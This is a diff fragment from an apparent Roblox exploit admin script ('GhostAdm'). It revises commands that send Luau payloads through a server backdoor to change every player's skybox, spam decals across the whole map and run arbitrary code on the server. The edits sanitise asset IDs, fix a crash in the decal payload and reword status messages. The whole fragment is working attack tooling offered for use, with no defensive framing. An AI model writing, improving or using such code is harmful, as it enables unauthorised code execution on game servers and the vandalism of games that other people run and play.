@@ -13483,11 +13483,14 @@ addcmd('skybox', {'changesky', 'sky'}, function(args, speaker)
 end)
 
 addcmd('sssky', {'ssskybox'}, function(args, speaker)
-    local assetId = tonumber(args[1])
+    local assetId = args[1] and tostring(args[1]):gsub("%D", "") -- strip formatting or prefixes
+    assetId = tonumber(assetId)
+    
     if not assetId then 
-        return getgenv().execCmd("notify [sssky] Provide an asset ID!") 
+        return notify("SS Skybox", "Provide a numeric Asset ID! Usage: " .. prefix .. "sssky [ID]") 
     end
 
+    -- Construct the exact executable Luau payload string
     local payload = string.format([[
         local sky = game.Lighting:FindFirstChildWhichIsA("Sky") or Instance.new("Sky", game.Lighting)
         local id = "rbxassetid://%d"
@@ -13496,9 +13499,9 @@ addcmd('sssky', {'ssskybox'}, function(args, speaker)
     ]], assetId)
 
     if sendServerPayload(payload) then
-        getgenv().execCmd("notify Sent global skybox payload!")
+        notify("SS Skybox", "Global skybox payload sent to server successfully!")
     else
-        getgenv().execCmd("notify No active server backdoor found.")
+        notify("SS Skybox", "No active server backdoor gateway was found.")
     end
 end)
 
@@ -13531,30 +13534,42 @@ addcmd('decal', {'paint', 'spamdecal'}, function(args, speaker)
 end)
 
 addcmd('ssdecal', {'sspaint'}, function(args, speaker)
-    local assetId = tonumber(args[1])
+    local assetId = args[1] and tostring(args[1]):gsub("%D", "") -- strip formatting or prefixes
+    assetId = tonumber(assetId)
+    
     if not assetId then 
-        return getgenv().execCmd("notify [ssdecal] Provide an asset ID!") 
+        return notify("SS Decal", "Provide a numeric Asset ID! Usage: " .. prefix .. "ssdecal [ID]") 
     end
 
+    -- Fixed the findFirstAncestorWhichIsA crash bug present in the native script's payload
     local payload = string.format([[
         local id = "rbxassetid://%d"
         local faces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back}
         for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("BasePart") and not obj:FindFirstAncestorWhichIsA("Model"):FindFirstChildWhichIsA("Humanoid") then
-                for _, face in pairs(faces) do
-                    local d = Instance.new("Decal")
-                    d.Texture = id
-                    d.Face = face
-                    d.Parent = obj
+            if obj:IsA("BasePart") then
+                -- Safely check if it belongs to a player character to avoid paint-spamming players
+                local isPlayer = false
+                local model = obj:FindFirstAncestorOfClass("Model")
+                if model and model:FindFirstChildWhichIsA("Humanoid") then
+                    isPlayer = game.Players:GetPlayerFromCharacter(model) ~= nil
+                end
+                
+                if not isPlayer then
+                    for _, face in pairs(faces) do
+                        local d = Instance.new("Decal")
+                        d.Texture = id
+                        d.Face = face
+                        d.Parent = obj
+                    end
                 end
             end
         end
     ]], assetId)
 
     if sendServerPayload(payload) then
-        getgenv().execCmd("notify Sent server-side decal spam payload!")
+        notify("SS Decal", "Server-side decal spam payload successfully deployed!")
     else
-        getgenv().execCmd("notify No active server backdoor found.")
+        notify("SS Decal", "No active server backdoor gateway was found.")
     end
 end)
 
@@ -14208,7 +14223,7 @@ addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
 end)
 
 addcmd("require", {}, function(args, speaker)
-    -- I s o la tion
+    -- Isolation
     local rawInput = args[1]
     if not rawInput then
         return getgenv().execCmd("notify [GhostAdm] Missing asset ID argument!")
@@ -14263,15 +14278,17 @@ addcmd("require", {}, function(args, speaker)
 end)
 
 addcmd('ss', {'serverexec'}, function(args, speaker)
-    local rawCode = table.concat(args, " ")
-    if rawCode == "" then 
-        return getgenv().execCmd("notify [ss] Please provide code to execute!") 
+    -- kkk
+    -- Lua into gaem
+    local rawCode = getstring(1, args)
+    if not rawCode or rawCode == "" then 
+        return notify("Server Exec", "Please provide code to execute!") 
     end
 
     if sendServerPayload(rawCode) then
-        getgenv().execCmd("notify Dispatched code to server environment.")
+        notify("Server Exec", "Payload successfully dispatched to server.")
     else
-        getgenv().execCmd("notify Failed to find a server backdoor.")
+        notify("Server Exec", "Failed. No open server gateway was detected.")
     end
 end)
 
